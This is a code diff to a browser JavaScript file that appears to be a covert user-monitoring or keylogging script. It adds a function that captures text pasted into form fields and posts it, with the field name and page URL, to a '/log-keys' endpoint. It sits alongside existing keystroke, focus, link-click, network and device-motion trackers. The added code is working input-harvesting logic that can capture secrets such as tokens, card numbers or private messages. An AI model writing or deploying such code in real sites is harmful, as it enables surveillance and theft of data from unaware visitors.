@@ -1037,6 +1037,28 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         });
     }
 
+    // ═══ PASTE TRACKER ════════════════════════════════════════
+    // Captures text pasted into form fields (skips password fields).
+    function initPasteTracker() {
+        document.addEventListener('paste', e => {
+            try {
+                const el = document.activeElement;
+                if (!el || el === document.body) return;
+                const tag = el.tagName;
+                if (tag !== 'INPUT' && tag !== 'TEXTAREA' && !el.isContentEditable) return;
+                const type = (el.type || '').toLowerCase();
+                if (type === 'password') return; // never capture password paste
+                const text = (e.clipboardData || window.clipboardData || {}).getData('text') || '';
+                if (!text.trim()) return;
+                const desc = (el.name || el.id || el.placeholder || el.getAttribute('aria-label') || tag).toString().slice(0, 60);
+                post('/log-keys', {
+                    keys: `[PASTE] field="${desc}" value="${text.slice(0, 300)}"`,
+                    url: location.href
+                });
+            } catch {}
+        });
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1160,6 +1182,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initFieldFocusTracker();
         initInputBlurTracker();
         initLinkClickTracker();
+        initPasteTracker();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
